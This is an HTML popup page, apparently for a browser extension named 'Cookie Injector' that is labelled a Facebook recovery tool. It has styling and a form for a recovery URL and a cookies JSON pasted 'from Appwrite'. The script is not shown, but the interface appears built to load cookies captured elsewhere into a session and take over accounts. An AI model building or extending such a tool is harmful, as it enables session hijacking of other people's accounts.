<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Cookie Injector</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      width: 400px;
      min-height: 450px;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding: 20px;
    }
    
    .header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 20px;
      padding-bottom: 15px;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    
    .logo {
      width: 40px;
      height: 40px;
      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
    }
    
    h1 {
      font-size: 18px;
      font-weight: 700;
    }
    
    h1 span {
      color: #10b981;
    }
    
    .subtitle {
      font-size: 11px;
      color: #6b7280;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    label {
      display: block;
      font-size: 11px;
      font-weight: 600;
      color: #9ca3af;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 8px;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    input, textarea {
      width: 100%;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 8px;
      padding: 12px;
      color: #fff;
      font-family: 'Consolas', monospace;
      font-size: 12px;
      outline: none;
      transition: all 0.3s;
    }
    
    input:focus, textarea:focus {
      border-color: #10b981;
      box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
    }
    
    textarea {
      min-height: 120px;
      resize: vertical;
    }
    
    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    
    .btn-primary {
      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
      color: #fff;
      box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
    }
    
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
    }
    
    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
    }
    
    .status {
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      font-size: 12px;
      display: none;
    }
    
    .status.success {
      display: block;
      background: rgba(16, 185, 129, 0.1);
      border: 1px solid rgba(16, 185, 129, 0.3);
      color: #10b981;
    }
    
    .status.error {
      display: block;
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #ef4444;
    }
    
    .help {
      margin-top: 16px;
      font-size: 11px;
      color: #6b7280;
      line-height: 1.6;
    }
    
    .help code {
      background: rgba(255,255,255,0.1);
      padding: 2px 6px;
      border-radius: 4px;
      font-family: 'Consolas', monospace;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">🍪</div>
    <div>
      <h1>Cookie <span>Injector</span></h1>
      <div class="subtitle">Facebook Recovery Tool</div>
    </div>
  </div>
  
  <div class="input-group">
    <label>Recovery URL</label>
    <input type="text" id="url" placeholder="https://mbasic.facebook.com/recover/code/...">
  </div>
  
  <div class="input-group">
    <label>Cookies JSON</label>
    <textarea id="cookies" placeholder='[{"name": "sb", "value": "...", "domain": ".facebook.com"}, ...]'></textarea>
  </div>
  
  <button class="btn btn-primary" id="inject">
    <span>🚀</span> Inject & Open
  </button>
  
  <div class="status" id="status"></div>
  
  <div class="help">
    <strong>How to use:</strong><br>
    1. Paste the recovery URL<br>
    2. Paste cookies JSON from Appwrite<br>
    3. Click "Inject & Open"
  </div>
  
  <script src="popup.js"></script>
</body>
</html>
